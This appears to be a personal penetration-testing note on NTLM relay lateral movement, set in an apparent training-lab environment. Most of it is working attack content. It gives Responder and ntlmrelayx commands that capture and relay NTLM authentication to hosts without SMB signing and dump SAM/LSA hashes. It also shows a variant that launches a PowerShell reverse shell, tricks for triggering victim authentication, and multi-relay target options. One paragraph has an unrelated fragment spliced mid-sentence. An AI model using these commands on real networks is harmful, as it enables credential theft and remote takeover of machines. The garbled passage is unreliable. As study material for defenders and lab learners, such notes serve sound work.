#lateral_movement 

this is used to Dump SAM/LSA (LSASS) hashes , the relayed machine **should have SMB Signing disable**

How does it work?
1-The attacker sets up a fake SMB server on their device.
2-The victim's device attempts to connect to this server (for example, requesting a file or share that doesn't exist).
3-The victim sends the login credentials (NTLM authentication).
4-Instead of storing the hash, the hacker immediately sends it to another device (target) using the same credentials and dump there SAM.
5-If this user has privileges on the other device, login is successful. 

-------------


> [!NOTE] Note
> The user has to be domain or local admin on the relayed machine or else we will get `DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied`



```bash
# in this scenario we are relaying form DC01$ to WS01$ that has smb sigining disable.

sudo ntlmrelayx.py -t 10.10.111.11  -smb2support 2>/dev/null

-t -> target to be relayed to. # WS01 in this case
```

```bash
# first: sudo vi /etc/responder/Responder.conf
# Edit Responder settings: SMB = Off and HTTP = Off

sudo responder -I vmnet2 -dwv
```

we can also get a rev shell
```bash
ntlmrelayx.py -t 10.10.111.11 -smb2support -c '<POWERSHELL_REVSHELL'
```

then we need to wait for someone to access a share that is not valid or trigger with:
- `\\fafa`  in explorer
- `START \\asda` in cmd

---

The HTTP and SMB servers of ntlmrelyax have the multi-relaying feature enabled by default, except when attacking a single general target . Depending on the target type , ntlmrelayx has the following default settings for the multi-relay feature:

| Target Type           | Example                                    | Multi-relaying Default Status |
| --------------------- | ------------------------------------------ | ----------------------------- |
| Single General Target | `-t 172.16.117.50`                         | Disabled                      |
| Single Named Target   | `-t smb://INLANEFREIGHT\[email protected]` | Enabled                       |
| Multiple Targets      | `-tf relayTargets.txt`                     | Enabled                       |
suppose we instruct ntlmrelayx to use the target " smb://172.16.117.50 "; in this case, since it is a general target , multi-relay will be disabled , and ntlmrelayx will relay only the first NTLM authentication connection belonging to any user (from any host) to the relay target 172.16.117.50 over SMB. This relationship is 1:1 , as one connection maps to only one attack (an edge case is whereby ntlmrelayx receives two different connections at the same time; although multi-relay will be disabled, ntlmrelayx incorrectly relays the two connections instead of rejecting either of them)

Alternatively, suppose we instruct ntlmrelayx to use the target `smb://INLANEFREIGHT\\[email protected]` ; in this case, since it is a single named target , multi-relay will be enabled , and ntlmrelayx will relay any number of NTLM authentication connections scheme : Defines the targeted protocol (e.g., http or ldap ); if not supplied, smb is used as the default protocol. The wildcard keyword all belonging to `INLANEFREIGHT\PETER` (from any host) to the relay target 172.16.117.50 over SMB (we must supply the domain name and username precisely as shown in ntlmrelayx 's output). This relationship is M:M , as many connections map to many attacks:
```bash
ntlmrelayx.py -t smb://INLANEFREIGHT\\[email protected]
```

What if we want to use the same general target ` smb://172.16.117.50`  but we also want to enable multi-relaying ? To do so, we must put the target in a file and use the `-tf `option, which enables multi-relaying by default. Therefore, regardless of the file containing a general target , because multi-relaying is enabled due to the `-tf` option, ntlmrelayx will relay any number of NTLM authentication connections belonging to any user (from any host) to the relay target 172.16.117.50 over SMB. Instead of having a 1:1 relationship like general targets , this becomes M:M , as many connections map to many attacks:

```bash
$ cat relayTarget.txt
smb://172.16.117.50

$ ntlmrelayx.py -tf relayTarget.txt
```